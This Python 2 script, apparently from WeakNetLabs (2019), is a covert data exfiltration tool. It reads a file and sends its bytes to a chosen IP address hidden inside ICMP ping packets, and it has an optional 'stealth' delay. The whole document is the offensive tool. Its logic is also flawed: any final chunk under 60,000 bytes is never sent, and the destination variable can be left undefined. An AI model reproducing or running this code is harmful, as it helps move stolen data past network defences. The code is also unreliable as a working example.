#!/usr/bin/python
# Let's ping.
# 2019 WeakNetLabs@Gmail.com, Douglas Berdeaux
# super specific here:
from sys import argv
from scapy.layers.inet import IP,ICMP
from scapy.sendrecv import send
from sys import argv
import time
import re
import binascii # bytes to hex for file input
fileData = "" # read in file and send via ping, less than 60kB
stealth=False # boolean for enabling stealth mode
# User-defined function to print usage and exit
def usage():
	usageMsg="""
 PingHexFil - 2019 WeakNetLabs

 Usage: ./ping.py IP ADDRESS) (FILE NAME) [optional: ](--stealth)]
"""
	print usageMsg
	exit(1)
# User defined fucntion to send data packet:
def sendData(fileData,dstIp):
	if(stealth):
		time.sleep(1) # one second
	send(IP(dst=dstIp)/ICMP()/fileData, verbose=False)
	print "[+] "+str(len(fileData))+" bytes sent via ICMP." # done.

# And finally, the workflow:
if (len(argv)<3): # we require an IP
	usage()
else: # The IP address checks out?:
	if (re.search("^([12]?[0-9]?[0-9]+\.){3}[12]?[0-9]?[0-9]+$",argv[1])):
		dstIp=argv[1]
	if (len(argv)>3):
		if(argv[3]=="--stealth"):
			stealth=True

print "[+] Opening file: "+argv[2]
print "[+] Please ensure that the destination, "+dstIp+" is capturing ICMP traffic."
byteCount=0 # This will be a counter token
packetCount=0 # token for how many ICMP requests we make
with open(argv[2],'rb') as byte:
	hexByte = byte.read(1) # create a hax value of the byte
	while (hexByte != ""):
		byteCount+=1 # increment counter
		fileData += hexByte # binascii.hexlify(hexByte) # append the byte to string
		if (byteCount==60000): # check string length, we can only send 60kB of data in packet
			sendData(fileData,dstIp) # send it
			packetCount+=1
			fileData = "" # reset the fileData string
			byteCount=0
		hexByte=byte.read(1)
print "[+] File exfiltration complete."
print "[+] "+str(packetCount)+" ICMP packets sent."
